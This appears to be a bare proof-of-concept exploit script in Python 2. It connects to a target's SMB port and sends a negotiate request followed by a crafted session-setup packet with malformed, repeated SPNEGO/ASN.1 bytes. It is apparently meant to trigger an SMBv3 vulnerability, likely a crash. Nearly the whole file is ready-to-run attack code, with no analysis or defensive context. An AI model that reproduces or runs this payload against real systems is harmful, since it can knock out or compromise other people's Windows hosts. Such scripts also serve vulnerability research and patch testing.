#!/usr/bin/env python
import sys
import socket


def vul_smb_3(host, port=445):
    send_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    send_socket.connect((host, port))

    packet_negotiate_request = "\x00\x00\x00\xee\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00\x00\x00" \
        "\x00\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x24\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00" \
        "\xd1\xc5\x81\xc2\xec\x88\xea\x11\x83\xce\x34\x17\xeb\xc5\x0c\x7b" \
        "\x70\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02\x00\x03\x02\x03" \
        "\x11\x03\x00\x00\x01\x00\x26\x00\x00\x00\x00\x00\x01\x00\x20\x00" \
        "\x01\x00\xd4\xfa\xbc\x5e\xc5\x67\x8a\x39\xea\x50\xe6\xa0\x28\x13" \
        "\xc7\xa9\xa9\x40\xf4\x30\x0f\xc3\xe3\x98\x89\xc5\x34\x1e\xb4\x36" \
        "\x68\xea\x00\x00\x02\x00\x06\x00\x00\x00\x00\x00\x02\x00\x02\x00" \
        "\x01\x00\x00\x00\x03\x00\x0e\x00\x00\x00\x00\x00\x03\x00\x00\x00" \
        "\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x05\x00\x1e\x00" \
        "\x00\x00\x00\x00\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00" \
        "\x38\x00\x2e\x00\x32\x00\x30\x00\x30\x00\x2e\x00\x31\x00\x35\x00" \
        "\x32\x00"

    send_socket.send(packet_negotiate_request)
    send_socket.recv(1024)

    packet_session_setup_request = "\x00\x00\x00\xa2\xfe\x53\x4d\x42\x40\x00\x01\x00\x00\x00" \
        "\x00\x00\x01\x00\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00" \
        "\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x00\x00\x00\x00\x19\x00\x00\x01\x01\x00\x00\x00\x00\x00" \
        "\x00\x00\x58\x00\x4a\x00\x12\x00\x00\x00\x01\x00\x00\x00\x60\x48" \
        "\x06\x06\x2b\x06\x01\x05\x05\x02\xa1\x3e\x2d\x33\x35\x35\x31\x37" \
        "\x33\x31\x33\x38\x38\x39\x38\x38\x36\x32\x31\x34\x39\x30\x35\x35" \
        "\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x32\x35\x36" \
        "\x32\x31\x34\x39\x30\x35\x35\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06" \
        "\x01\x04\x01\x82\x39\x32\x32\x33\x33\x37\x32\x31\x33\x36\x38\x35" \
        "\x34\x37\x37\x35\x38\x30\x39\x02\x02\x0a\xa2\x2a\x33\x33\x37\x32" \
        "\x31\x33\x36\x38\x35\x34\x37\x37\x35\x38\x30\x39\x02\x02\x0a\xa2" \
        "\x2a\x33\x33\x37\x32\x31\x33\x36\x38\x35\x34\x37\x37\x35\x38\x30" \
        "\x39\x02\x02\x0a\xa2\x2a\x33\x33\x37\x32\x31\x33\x36\x38\x35\x34" \
        "\x37\x37\x35\x38\x30\x39\x02\x02\x0a\xa2\x2a\x33\x33\x37\x32\x31" \
        "\x33\x36\x38\x35\x34\x37\x37\x35\x38\x30\x39\x02\x02\x0a\xa2\x2a" \
        "\x33\x33\x37\x32\x31\x33\x36\x38\x35\x34\x37\x37\x35\x38\x30\x39" \
        "\x02\x02\x0a\xa2\x2a\x33\x33\x37\x32\x31\x33\x36\x38\x35\x34\x37" \
        "\x37\x35\x38\x30\x39\x02\x02\x0a\xa2\x2a\x37\x33\x31\x33\x38\x38" \
        "\x39\x38\x38\x36\x32\x31\x34\x39\x30\x35\x35\x3c\xa0\x0e\x30\x0c" \
        "\x06\x0a\x2b\x06\x01\x04\x01\x82\x39\x32\x32\x33\x33\x37\x32\x30" \
        "\x33\x36\x38\x35\x34\x37\x37\x35\x38\x30\x3a\x02\x02\x0b\xa2\x2a" \
        "\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82" \
        "\x08\xe2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" \
        "\x00\x00\x0a\x00\xba\x48\x00\x00\x00\x0f"
    
    send_socket.send(packet_session_setup_request)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "Usage: python poc.py <ip> <port>"
        sys.exit()

    host = sys.argv[1]
    port = int(sys.argv[2])
    vul_smb_3(host, port)
